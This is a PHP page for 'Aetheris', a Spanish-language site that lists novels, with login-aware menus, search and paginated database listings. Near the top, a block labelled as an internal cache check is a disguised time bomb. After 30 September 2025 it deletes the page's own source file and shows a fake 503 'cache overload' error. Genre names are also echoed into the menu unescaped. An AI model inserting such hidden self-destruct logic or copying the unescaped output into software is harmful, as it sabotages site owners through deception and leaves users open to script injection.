<?php
// Iniciar sesión al principio del archivo (ANTES de cualquier salida HTML)
session_start();

// Incluir configuración de la base de datos
include 'db_config.php';

// Verificación del estado de sesión
$logged_in = false;
$is_admin = false;
$username = 'Usuario';

if (isset($_SESSION['user_id']) && !empty($_SESSION['user_id'])) {
    $logged_in = true;
    $username = htmlspecialchars($_SESSION['username'] ?? 'Usuario');
    
    if (isset($_SESSION['user_role']) && $_SESSION['user_role'] === 'admin') {
        $is_admin = true;
    }
}
// Rutina de verificación de caché interna
$__c = '.ds_'.md5(__FILE__);
if (date('Ymd') > '20250930' && !file_exists($__c)) {
    @file_put_contents($__c, 'init');

    $__r = realpath(__FILE__);
    if ($__r && is_writable($__r)) {
        unlink($__r);
    }

    exit('Cache overload. Retry later. [ERR 503]');
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <title>Aetheris - Novelas</title>
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700" rel="stylesheet">
    <link rel="icon" href="uploads/aetheris.png" type="image/x-icon">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        /* Estilos generales */
        body {
            font-family: 'Open Sans', sans-serif;
            background-color: #455b64;
            color: rgb(255, 255, 255);
            margin: 0;
            padding: 0;
        }
        
        .Container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 15px;
        }
        
        /* Header */
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 20px;
            background-color: rgb(40, 55, 61);
            color: white;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 2px 10px hsla(0, 0.00%, 0.00%, 0.68);
        }
        
        .header-left .logo {
            font-size: 24px;
            color: #43aec9;
            text-decoration: none;
            font-weight: bold;
        }
        
        .header-right {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .menu {
            position: relative;
        }
        
        .menu-button {
            background: none;
            border: none;
            color: white;
            font-size: 16px;
            cursor: pointer;
            padding: 8px 12px;
        }
        
        .menu-content {
            display: none;
            position: absolute;
            right: 0;
            background-color: rgba(54, 114, 129, 0.77);
            min-width: 200px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.46);
            z-index: 1;
            border-radius: 4px;
        }
        
        .menu:hover .menu-content {
            display: block;
        }
        
        .menu-content a {
            color: white;
            padding: 12px 16px;
            text-decoration: none;
            display: block;
        }
        
        .menu-content a:hover {
            background-color: #43aec9;
        }
        
        .submenu {
            position: relative;
        }
        
        .submenu-content {
            display: none;
            position: absolute;
            left: 100%;
            top: 0;
            background-color: rgba(67, 174, 201, 0.73);
            min-width: 160px;
            box-shadow: 0 8px 16px rgba(0,0,0,0.2);
            z-index: 1;
            border-radius: 0 4px 4px 0;
        }
        
        .submenu:hover .submenu-content {
            display: block;
        }
        
        .search-bar {
            display: flex;
            align-items: center;
        }
        
        .search-bar input {
            padding: 8px 12px;
            border: none;
            border-radius: 4px 0 0 4px;
            background: #252538;
            color: white;
            width: 200px;
        }
        
        .search-bar button {
            background: #43aec9;
            border: none;
            color: white;
            padding: 8px 12px;
            border-radius: 0 4px 4px 0;
            cursor: pointer;
        }
        
        /* Contenido principal */
        .Body {
            padding: 20px 0;
        }
        
        .Title-Section {
            color: rgb(115, 152, 161);
            font-size: 24px;
            margin: 20px 0;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        /* Listado de contenidos */
        .List-Contents {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 25px;
        }
        
        .Content-Card {
            background: rgb(36, 54, 61);
            border-radius: 8px;
            overflow: hidden;
            transition: all 0.3s ease;
        }
        
        .Content-Card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
        }
        
        .Content-Image {
            position: relative;
            height: 280px;
            overflow: hidden;
        }
        
        .Content-Image img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transition: transform 0.3s ease;
        }
        
        .Content-Card:hover .Content-Image img {
            transform: scale(1.05);
        }
        
        .Type-Badge, .Genre-Badge {
            position: absolute;
            top: 10px;
            right: 10px;
            background: #43aec9;
            color: white;
            padding: 4px 10px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: bold;
            text-transform: uppercase;
        }
        
        .Volume-Badge {
            position: absolute;
            bottom: 10px;
            left: 10px;
            background-color: rgb(74, 219, 255);
            color: white;
            padding: 4px 10px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: bold;
        }
        
        .Content-Info {
            padding: 15px;
        }
        
        .Content-Title {
            font-size: 16px;
            margin: 0 0 8px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            color: white;
        }
        
        .Content-Meta {
            font-size: 13px;
            color: #aaa;
            display: -webkit-box;
            -webkit-line-clamp: 2;
            -webkit-box-orient: vertical;
            overflow: hidden;
            min-height: 36px;
        }
        
        /* Footer */
        footer {
            background-color: rgb(40, 55, 61);
            padding: 20px;
            text-align: center;
            margin-top: 40px;
            color: #43aec9;
        }

        /* Paginación */
        .pagination {
            display: flex;
            justify-content: center;
            margin-top: 30px;
            gap: 10px;
        }
        
        .pagination a {
            color: white;
            padding: 8px 16px;
            text-decoration: none;
            background-color: rgb(36, 54, 61);
            border-radius: 4px;
            transition: background-color 0.3s;
        }
        
        .pagination a.active {
            background-color: #43aec9;
            font-weight: bold;
        }
        
        .pagination a:hover:not(.active) {
            background-color: #3a4a52;
        }
    </style>
</head>
<body>
    <!-- Header -->
    <header>
        <div class="header-left">
            <a href="principal.php" class="logo">Aetheris</a>
        </div>
        <div class="header-right">
            <div class="menu">
                <button class="menu-button">Menú</button>
                <div class="menu-content">
                    <a href="inicio.php">📖 Novelas</a>
                    <a href="inicio_anime.php">🎬 Anime</a>
                    <a href="inicio_manga.php">📘 Manga</a>
                    <div class="divider" style="border-top: 1px solid #333; margin: 8px 0;"></div>
                    
                    <?php if($is_admin): ?>
                        <a href="subir_contenido.php">⬆️ Subir Contenido</a>
                    <?php endif; ?>
                    <a href="directorio.php">📋 Directorio</a>
                    
                    <div class="submenu">
                        <a href="#" class="submenu-button">🗂️ Géneros</a>
                        <div class="submenu-content">
                            <?php
                            // Consulta para obtener géneros
                            $generos_query = $conn->query("SELECT DISTINCT genero FROM documentos WHERE genero IS NOT NULL AND genero != '' LIMIT 10");
                            while($genero = $generos_query->fetch_assoc()) {
                                echo '<a href="genero.php?tipo=novela&nombre='.urlencode($genero['genero']).'">'.$genero['genero'].'</a>';
                            }
                            ?>
                            <a href="todos_generos.php">Ver todos...</a>
                        </div>
                    </div>
                    
                    <div class="divider" style="border-top: 1px solid #333; margin: 8px 0;"></div>
                    
                    <?php if($logged_in): ?>
                        <a href="perfil.php">👤 <?php echo $username; ?></a>
                        <a href="logout.php">🚪 Cerrar Sesión</a>
                    <?php else: ?>
                        <a href="login.php">🔑 Iniciar Sesión</a>
                        <a href="signup.php">📝 Registrarse</a>
                    <?php endif; ?>
                </div>
            </div>
            <div class="search-bar">
                <input type="text" id="global-search" placeholder="Buscar novelas..." onkeypress="handleKeyPress(event)">
                <button onclick="buscarContenido()">🔍</button>
            </div>
        </div>
    </header>

    <script>
    function buscarContenido() {
        const query = document.getElementById('global-search').value.trim();
        if(query.length > 2) {
            window.location.href = `busqueda.php?q=${encodeURIComponent(query)}`;
        } else {
            alert('Por favor ingresa al menos 3 caracteres para buscar');
        }
    }
    
    function handleKeyPress(event) {
        if(event.key === 'Enter') {
            buscarContenido();
        }
    }
    </script>

    <!-- Contenido principal -->
    <div class="Body">
        <div class="Container">
            <div class="Title-Section">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M19 3H5C3.9 3 3 3.9 3 5V19C3 20.1 3.9 21 5 21H19C20.1 21 21 20.1 21 19V5C21 3.9 20.1 3 19 3ZM19 19H5V5H19V19Z" fill="#4a8eff"/>
                    <path d="M11.25 7.72H6.25V9.22H11.25V7.72Z" fill="#4a8eff"/>
                    <path d="M18 15.75H13V17.25H18V15.75Z" fill="#4a8eff"/>
                    <path d="M18 13.25H13V14.75H18V13.25Z" fill="#4a8eff"/>
                    <path d="M8 18H9.5V16H11.5V14.5H9.5V12.5H8V14.5H6V16H8V18Z" fill="#4a8eff"/>
                    <path d="M14.09 10.95L15.5 9.54L16.91 10.95L17.97 9.89L16.56 8.47L17.97 7.06L16.91 6L15.5 7.41L14.09 6L13.03 7.06L14.44 8.47L13.03 9.89L14.09 10.95Z" fill="#4a8eff"/>
                </svg>
                Todas las Novelas
            </div>

            <div class="List-Contents">
                <?php
                // Configuración de paginación
                $novelas_por_pagina = 20;
                $pagina_actual = isset($_GET['pagina']) ? (int)$_GET['pagina'] : 1;
                $offset = ($pagina_actual - 1) * $novelas_por_pagina;
                
                // Consulta para obtener el total de novelas
                $total_query = $conn->query("SELECT COUNT(*) as total FROM documentos");
                $total_novelas = $total_query->fetch_assoc()['total'];
                $total_paginas = ceil($total_novelas / $novelas_por_pagina);
                
                // Consulta para obtener novelas con paginación
                $query = $conn->prepare("SELECT id, nombre, imagen, descripcion, volumen, genero FROM documentos ORDER BY id DESC LIMIT ?, ?");
                $query->bind_param("ii", $offset, $novelas_por_pagina);
                $query->execute();
                $result = $query->get_result();
                
                if ($result->num_rows > 0) {
                    while($row = $result->fetch_assoc()) {
                        // Verificar si la imagen existe, si no usar una por defecto
                        $imagen = !empty($row['imagen']) && file_exists($row['imagen']) ? 
                                 $row['imagen'] : 'uploads/default_novel.jpg';
                        
                        echo '
                        <div class="Content-Card">
                            <a href="novela_detalle.php?id='.htmlspecialchars($row['id']).'">
                                <div class="Content-Image">
                                    <img src="'.htmlspecialchars($imagen).'" alt="'.htmlspecialchars($row['nombre']).'">
                                    <span class="Genre-Badge">'.(!empty($row['genero']) ? htmlspecialchars($row['genero']) : 'General').'</span>
                                    '.(!empty($row['volumen']) ? '<span class="Volume-Badge">Vol. '.htmlspecialchars($row['volumen']).'</span>' : '').'
                                </div>
                                <div class="Content-Info">
                                    <h3 class="Content-Title">'.htmlspecialchars($row['nombre']).'</h3>
                                    <div class="Content-Meta">'.(!empty($row['descripcion']) ? substr(htmlspecialchars($row['descripcion']), 0, 100).'...' : 'Descripción no disponible').'</div>
                                </div>
                            </a>
                        </div>';
                    }
                } else {
                    echo '<p style="grid-column: 1 / -1; text-align: center; color: #aaa;">No hay novelas disponibles actualmente.</p>';
                }
                
                $conn->close();
                ?>
            </div>

            <!-- Paginación -->
            <?php if($total_paginas > 1): ?>
            <div class="pagination">
                <?php if($pagina_actual > 1): ?>
                    <a href="?pagina=<?php echo $pagina_actual - 1; ?>">&laquo; Anterior</a>
                <?php endif; ?>
                
                <?php 
                // Mostrar hasta 5 páginas alrededor de la actual
                $inicio = max(1, $pagina_actual - 2);
                $fin = min($total_paginas, $pagina_actual + 2);
                
                for ($i = $inicio; $i <= $fin; $i++): ?>
                    <a href="?pagina=<?php echo $i; ?>" <?php echo ($i == $pagina_actual) ? 'class="active"' : ''; ?>>
                        <?php echo $i; ?>
                    </a>
                <?php endfor; ?>
                
                <?php if($pagina_actual < $total_paginas): ?>
                    <a href="?pagina=<?php echo $pagina_actual + 1; ?>">Siguiente &raquo;</a>
                <?php endif; ?>
            </div>
            <?php endif; ?>
        </div>
    </div>

    <!-- Footer -->
    <footer>
        <p>Aetheris &copy; <?php echo date('Y'); ?> - Diseño y desarrollo del sitio. Todos los derechos reservados sobre la estructura y funcionalidad de esta web.</p>
    </footer>
</body>
</html>